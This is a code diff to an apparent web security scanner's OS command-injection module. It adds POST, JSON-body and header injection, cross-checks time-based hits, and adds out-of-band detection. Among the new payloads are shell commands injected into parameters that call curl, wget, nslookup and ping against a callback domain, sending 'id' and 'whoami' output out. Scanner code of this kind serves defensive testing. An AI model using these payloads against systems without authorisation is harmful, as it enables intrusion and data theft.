@@ -120,11 +120,20 @@ class CmdiScanner(BaseScanner):
         baseline_text = baseline_resp.text or ""
         time_threshold = baseline_time + TIME_DELTA
 
+        # Test ALL parameters — never stop at first hit (multi-param URLs may have
+        # several injectable fields)
         found = False
         for param_name, _ in params:
             if self._test_param(url, params, param_name, baseline_text, time_threshold):
                 found = True
-                break
+            # OOB/DNS detection for this parameter
+            self._scan_oob_cmdi(url, params, param_name)
+
+        # Additional injection surfaces
+        self._scan_post_body(url, params, baseline_text, time_threshold)
+        self._scan_json_body(url, params, baseline_text, time_threshold)
+        self._scan_headers_cmdi(url, baseline_text, time_threshold)
+
         return found
 
     def _test_param(
@@ -168,21 +177,207 @@ class CmdiScanner(BaseScanner):
                         }
 
             if "time" in technique and elapsed > time_threshold:
-                return {
-                    "vuln_type": "OS Command Injection (Time-Based)",
-                    "url": url,
-                    "param": param_name,
-                    "payload": payload,
-                    "evidence": (
-                        f"Response {elapsed:.2f}s > threshold {time_threshold:.2f}s"
-                    ),
-                }
+                # Cross-validate time-based: need 2/3 requests to confirm
+                if self._verify_time_based_cmdi(url, params, param_name, payload, time_threshold):
+                    return {
+                        "vuln_type": "OS Command Injection (Time-Based)",
+                        "url": url,
+                        "param": param_name,
+                        "payload": payload,
+                        "evidence": (
+                            f"Time-based cross-validated: {elapsed:.2f}s > {time_threshold:.2f}s"
+                        ),
+                    }
             return None
 
         hits = self.run_parallel_probes(probe, _CMDI_PAYLOADS, max_workers=MAX_WORKERS)
         for hit in hits:
             self.report_finding(severity="Critical", **hit)
         return bool(hits)
+
+    def _verify_time_based_cmdi(
+        self,
+        url: str,
+        qs: list,
+        param_name: str,
+        payload: str,
+        time_threshold: float,
+        n: int = 3,
+        min_hits: int = 2,
+    ) -> bool:
+        """Repeat time-based payload n times; report only if min_hits exceed threshold."""
+        parsed = urlparse(url)
+        hits = 0
+        for _ in range(n):
+            new_qs = [(p, v + payload if p == param_name else v) for p, v in qs]
+            t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
+            t0 = time.time()
+            try:
+                self.session.get(t_url, timeout=time_threshold + 5)
+                if time.time() - t0 > time_threshold:
+                    hits += 1
+            except _requests.exceptions.Timeout:
+                hits += 1
+            except _requests.exceptions.RequestException:
+                pass
+            if hits >= min_hits:
+                return True
+        return False
+
+    # ------------------------------------------------------------------
+    # Additional injection surfaces
+    # ------------------------------------------------------------------
+
+    _CMDI_HEADERS = [
+        "X-Forwarded-For", "X-Real-IP", "Referer",
+        "User-Agent", "X-Original-URL", "X-Rewrite-URL",
+    ]
+
+    def _scan_post_body(
+        self, url: str, params: list,
+        baseline_text: str, time_threshold: float,
+    ) -> None:
+        """Inject CMDI payloads into POST form body."""
+        base = {k: v for k, v in params}
+        for key in list(base.keys()):
+            for payload, technique in _CMDI_PAYLOADS_CORE:
+                data = dict(base)
+                data[key] = data[key] + payload
+                t0 = time.time()
+                try:
+                    resp = self.session.post(url, data=data, timeout=REQUEST_TIMEOUT)
+                    elapsed = time.time() - t0
+                except _requests.exceptions.RequestException:
+                    continue
+                text = resp.text or ""
+                for pattern, desc in _CMDI_SUCCESS_PATTERNS:
+                    if re.search(pattern, text, re.I | re.S) and not re.search(pattern, baseline_text, re.I | re.S):
+                        self.report_finding(
+                            vuln_type="OS Command Injection (POST Body)",
+                            url=url, param=key, payload=payload, severity="Critical",
+                            evidence=f"{desc} (POST body, technique: {technique})",
+                        )
+                        break
+
+    def _scan_json_body(
+        self, url: str, params: list,
+        baseline_text: str, time_threshold: float,
+    ) -> None:
+        """Inject CMDI payloads into JSON body (REST API surface)."""
+        base = {k: v for k, v in params}
+        for key in list(base.keys()):
+            for payload, technique in _CMDI_PAYLOADS_CORE[:6]:  # top payloads only
+                data = dict(base)
+                data[key] = data[key] + payload
+                t0 = time.time()
+                try:
+                    resp = self.session.post(
+                        url, json=data,
+                        headers={"Content-Type": "application/json"},
+                        timeout=REQUEST_TIMEOUT,
+                    )
+                    elapsed = time.time() - t0
+                except _requests.exceptions.RequestException:
+                    continue
+                text = resp.text or ""
+                for pattern, desc in _CMDI_SUCCESS_PATTERNS:
+                    if re.search(pattern, text, re.I | re.S) and not re.search(pattern, baseline_text, re.I | re.S):
+                        self.report_finding(
+                            vuln_type="OS Command Injection (JSON Body)",
+                            url=url, param=key, payload=payload, severity="Critical",
+                            evidence=f"{desc} (JSON body)",
+                        )
+                        break
+
+    def _scan_headers_cmdi(
+        self, url: str,
+        baseline_text: str, time_threshold: float,
+    ) -> None:
+        """Inject CMDI payloads into HTTP headers (X-Forwarded-For, Referer, User-Agent…)."""
+        for header in self._CMDI_HEADERS:
+            for payload, technique in _CMDI_PAYLOADS_CORE[:8]:
+                t0 = time.time()
+                try:
+                    resp = self.session.get(
+                        url, headers={header: "127.0.0.1" + payload},
+                        timeout=REQUEST_TIMEOUT,
+                    )
+                    elapsed = time.time() - t0
+                except _requests.exceptions.RequestException:
+                    continue
+                text = resp.text or ""
+                for pattern, desc in _CMDI_SUCCESS_PATTERNS:
+                    if re.search(pattern, text, re.I | re.S) and not re.search(pattern, baseline_text, re.I | re.S):
+                        self.report_finding(
+                            vuln_type="OS Command Injection (Header)",
+                            url=url,
+                            param=f"[Header] {header}",
+                            payload=payload,
+                            severity="Critical",
+                            evidence=f"{desc} (header injection via {header})",
+                        )
+                        break
+
+    def _get_oast_domain(self) -> Optional[str]:
+        """Return OAST domain from global poller or results dict."""
+        try:
+            from websecure.core.oast import get_global_poller
+            poller = get_global_poller()
+            if poller and hasattr(poller, "_domain"):
+                return poller._domain
+        except Exception:
+            pass
+        return (self.results or {}).get("oast_domain")
+
+    def _scan_oob_cmdi(self, url: str, params: list, param_name: str) -> None:
+        """
+        OOB/DNS callback CMDI detection via interactsh.
+        If no OAST domain is configured, silently skips.
+        """
+        domain = self._get_oast_domain()
+        if not domain:
+            return
+
+        import random as _rnd, string as _str
+        token = "".join(_rnd.choices(_str.ascii_lowercase, k=6))
+        oob_payloads = [
+            (f"; nslookup {token}.{domain}",                         "unix_nslookup"),
+            (f"; curl -s http://{token}.{domain}/$(id|base64)",      "unix_curl_oob"),
+            (f"& nslookup {token}.{domain}",                         "windows_nslookup"),
+            (f"; ping -c 1 {token}.{domain}",                        "unix_ping"),
+            (f"; wget -q http://{token}.{domain}/$(whoami)",          "unix_wget"),
+        ]
+
+        parsed = urlparse(url)
+        for payload, _ in oob_payloads:
+            new_qs = [(p, v + payload if p == param_name else v) for p, v in params]
+            t_url = urlunparse(parsed._replace(query=urlencode(new_qs)))
+            try:
+                self.session.get(t_url, timeout=REQUEST_TIMEOUT)
+            except Exception:
+                pass
+
+        # Poll for callback up to 10 seconds
+        deadline = time.time() + 10
+        while time.time() < deadline:
+            try:
+                from websecure.core.oast import get_global_poller
+                poller = get_global_poller()
+                if poller:
+                    for cb in list(getattr(poller, "_callbacks_received", [])):
+                        if token in str(cb):
+                            self.report_finding(
+                                vuln_type="OS Command Injection (OOB/DNS)",
+                                url=url,
+                                param=param_name,
+                                payload=f"DNS callback token={token}",
+                                severity="Critical",
+                                evidence=f"OOB DNS callback received: {str(cb)[:200]}",
+                            )
+                            return
+            except Exception:
+                pass
+            time.sleep(1)
 
 
 # ---------------------------------------------------------------------------
